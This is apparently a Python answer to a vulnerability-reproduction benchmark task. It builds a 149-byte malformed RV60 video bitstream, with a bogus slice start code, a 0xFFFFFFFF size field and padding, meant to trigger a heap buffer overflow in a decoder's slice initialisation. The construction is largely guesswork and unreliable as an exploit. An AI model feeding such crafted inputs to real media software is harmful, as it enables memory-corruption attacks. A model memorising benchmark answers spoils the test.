import os
import tempfile
import subprocess
import struct
import hashlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Build a minimal RV60 bitstream that triggers the heap buffer overflow
        # by creating a slice with invalid size information
        
        # RV60 header structure basics:
        # - Start code: 0x000001
        # - Frame/slice type indicators
        
        poc = bytearray()
        
        # Add some initial bytes to look like a valid stream
        poc.extend(b'\x00\x00\x01\x00')  # Some start code
        
        # Create data that will cause improper initialization
        # The vulnerability is in slice gb initialization
        # We need to create a slice with mismatched size information
        
        # Add slice header with invalid/out-of-bounds size
        poc.extend(b'\x00\x00\x01\x0B')  # Slice start code
        
        # Add slice data with incorrect size markers
        # This should trigger the buffer overflow when gb is initialized
        # with wrong buffer size
        
        # Create malformed slice data
        slice_data = bytearray()
        
        # Add some initial slice parameters
        slice_data.append(0x80)  # Some flag
        
        # Add problematic size information
        # Large size that doesn't match actual allocation
        slice_data.extend(struct.pack('>I', 0xFFFFFFFF))  # Very large size
        
        # Add some actual data to trigger the overflow
        for i in range(100):
            slice_data.append(i & 0xFF)
        
        poc.extend(slice_data)
        
        # Ensure total length is close to ground truth (149 bytes)
        # Pad if necessary
        current_len = len(poc)
        if current_len < 149:
            poc.extend(b'\x00' * (149 - current_len))
        elif current_len > 149:
            poc = poc[:149]
        
        return bytes(poc)